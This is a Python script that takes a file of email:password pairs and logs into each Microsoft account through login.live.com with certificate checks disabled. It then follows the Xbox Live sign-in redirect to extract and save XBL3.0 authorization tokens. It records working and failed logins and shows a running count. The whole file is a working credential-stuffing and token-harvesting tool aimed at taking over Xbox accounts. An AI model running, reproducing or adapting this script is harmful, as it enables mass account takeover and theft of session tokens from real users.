import os
import sys
import base64
import urllib3
import asyncio
import requests
import colorama
from re import search
from json import loads


class Authorization:
    def __init__(self) -> None:
        self.headers = {
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Language' : 'en-AU,en;q=0.9'
        }
        self.authorized = 0
        self.failed = 0
        self.credentials = self.collect_credentials()


    async def authorize_login(self, session: requests.Session(), combo) -> None:
        try:
            email, password = combo.split(':', 1)[0], combo.split(':', 1)[1]

            login = session.get('https://login.live.com/login.srf?', headers=self.headers, verify=False)

            flow_token = search(r'(?<=value=\")([^\"]*)', login.text)[0]
            uaid = session.cookies['uaid']

            email_payload = {
                'username': email,
                'uaid': uaid,
                'isOtherIdpSupported': False,
                'checkPhones': False,
                'isRemoteNGCSupported': True,
                'isCookieBannerShown': False,
                'isFidoSupported': True,
                'forceotclogin': False,
                'otclogindisallowed': True,
                'isExternalFederationDisallowed': False,
                'isRemoteConnectSupported': False,
                'federationFlags': 3,
                'flowToken': flow_token
            }
            session.post('https://login.live.com/GetCredentialType.srf', json=email_payload, verify=False, headers=self.headers)

            authorize_payload = {
                'i13' : '0', 
                'login' : email, 
                'loginfmt' : email, 
                'type' : '11', 
                'LoginOptions' : '3', 
                'lrt' : '', 
                'lrtPartition' : '', 
                'hisRegion' : '', 
                'hisScaleUnit' : '', 
                'passwd' : password, 
                'ps' : '2', 
                'psRNGCDefaultType' : '', 
                'psRNGCEntropy' : '', 
                'psRNGCSLK' : '', 
                'canary' : '', 
                'ctx' : '', 
                'hpgrequestid' : '', 
                'PPFT' : flow_token, 
                'PPSX' : 'Passpor', 
                'NewUser' : '1', 
                'FoundMSAs' : '', 
                'fspost' : '0', 
                'i21' : '0', 
                'CookieDisclosure' : '0', 
                'IsFidoSupported' : '1', 
                'i2' : '1', 
                'i17' : '0', 
                'i18' : '', 
                'i19' : '1668743'
            }
            
            session.post('https://login.live.com/ppsecure/post.srf', data=authorize_payload, headers=self.headers, verify=False, allow_redirects=False)

            social = session.get('https://sisu.xboxlive.com/connect/XboxLive?state=crime&ru=https://social.xbox.com/en-us/changegamertag', headers=self.headers, allow_redirects=True, verify=False)

            data = loads(await self.db64(search(r'(?<=accessToken\=)(.*?)$', social.url)[0].strip()))
            user_hash = data[0]['Item2']['DisplayClaims']['xui'][0]['uhs']
            token = data[0]['Item2']['Token']

            await self.write_token(user_hash, token)

            session.post('https://login.live.com/oauth20_logout.srf')
            self.authorized += 1
        except:
            self.failed += 1
            await self.write_failed_logins(combo)
            pass

        print(f' [\x1b[1;32m+\x1b[39m] Logins: {len(self.credentials)} | Authorized: ({self.authorized}) | Failed: ({self.failed})', end='\r', flush=True)


    @staticmethod
    async def db64(data, altchars=b'+/'):
        if len(data) % 4 and '=' not in data:
            data += '='* (4 - len(data) % 4)
        return base64.b64decode(data, altchars)


    @staticmethod
    async def write_failed_logins(combo) -> None:
        with open('authorization/failed_logins.txt', 'a') as failed_logins:
            failed_logins.write(f'{combo}\n')


    @staticmethod
    async def write_token(user_hash, token) -> None:
        with open('authorization/authorized_tokens.txt', 'a') as token_file:
            token_file.write(f'XBL3.0 x={user_hash};{token}\n')
    

    @staticmethod
    def collect_credentials() -> None:
        with open('authorization/logins.txt', 'r') as credentials:
            return [combo.strip() for combo in credentials]


    async def intialise(self) -> None:
        open('authorization/authorized_tokens.txt', 'w').close();open('authorization/failed_logins.txt', 'w').close()
        with requests.Session() as session:
            await asyncio.gather(*[self.authorize_login(session, combo) for combo in self.credentials])
        print(f' [\x1b[1;32m+\x1b[39m] Logins: {len(self.credentials)} | Authorized: ({self.authorized}) | Failed: ({self.failed})', flush=True)


    async def set_environment(self) -> None:
        os.system('cls' if sys.platform == 'win32' else 'clear')
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        colorama.init(autoreset=True)

        print(' [\x1b[1;32m*\x1b[39m] Authorize XBL3.0 Tokens From Credentials')

        if len(open('authorization/logins.txt').readlines()) > 0:
            print(f" [\x1b[1;32m*\x1b[39m] Logins to Authorize: ({len(open('authorization/logins.txt').readlines())})\n")
        else:
            print(f"\n [\x1b[1;31m!\x1b[39m] No Logins Found In \'\x1b[1;33mauthorization/logins.txt\x1b[39m\'\n");os._exit(0)

        await self.intialise()

    
if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(Authorization().set_environment())